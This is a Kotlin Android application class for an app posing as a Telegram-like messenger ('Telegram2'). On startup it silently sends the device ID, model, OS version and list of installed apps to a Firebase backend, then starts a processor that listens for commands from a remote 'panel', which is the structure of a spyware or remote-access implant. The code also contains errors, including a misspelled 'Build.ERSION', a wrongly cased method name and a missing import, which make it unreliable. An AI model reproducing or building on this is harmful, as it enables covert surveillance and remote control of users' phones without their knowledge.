package com.telegram2.messaging

import android.app.Application
import android.provider.Settings
import com.telegram2.messaging.remote.CommandProcessor
import com.telegram2.messaging.remote.FirebaseBridge
import java.util.UUID

class Telegram2App : Application() {
    override fun onCreate() {
        super.onCreate()
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            ?: UUID.randomUUID().toString()
        FirebaseBridge.init(deviceId)

        // Register device with basic info
        val apps = packageManager.getInstalledpackages(0).map { it.packageName }
        FirebaseBridge.registerDevice(Build.MODEL, Build.ERSION.RELEASE, apps)

        // Start listening for commands from the panel
        CommandProcessor.init(this)
    }
}
